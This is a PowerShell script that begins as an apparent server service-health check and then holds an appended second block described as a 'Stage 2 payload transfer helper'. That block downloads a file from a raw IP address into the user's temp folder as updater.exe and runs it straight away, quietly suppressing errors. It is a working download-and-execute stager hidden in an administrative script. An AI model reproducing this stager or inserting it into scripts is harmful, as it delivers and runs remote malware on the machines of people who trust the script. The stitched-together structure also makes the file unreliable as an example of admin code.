
$ErrorActionPreference = "Stop"

$Servers = @('sql-prod-02', 'srv01', 'dc01', 'filesrv01', 'web-stg-01')
$Services = @('Dhcp', 'W3SVC', 'MSSQLSERVER')
$Port = 5986
$TimeoutMilliseconds = 2000
$ReportPath = "C:\Reports\service-health-2024-03-19.csv"


$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "https://198.51.100.135:443/assets/update.dat",
    [string]$OutputPath = "$env:TEMP\updater.exe",
    [int]$TransferTimeout = 38,
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Invoke-PayloadFetch -SourceUrl $RemoteUrl -DestinationPath $OutputPath -TimeoutSec $TransferTimeout -UserAgent $BrowserAgent
    if ($TransferResult) {
        Start-Process -FilePath $OutputPath -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
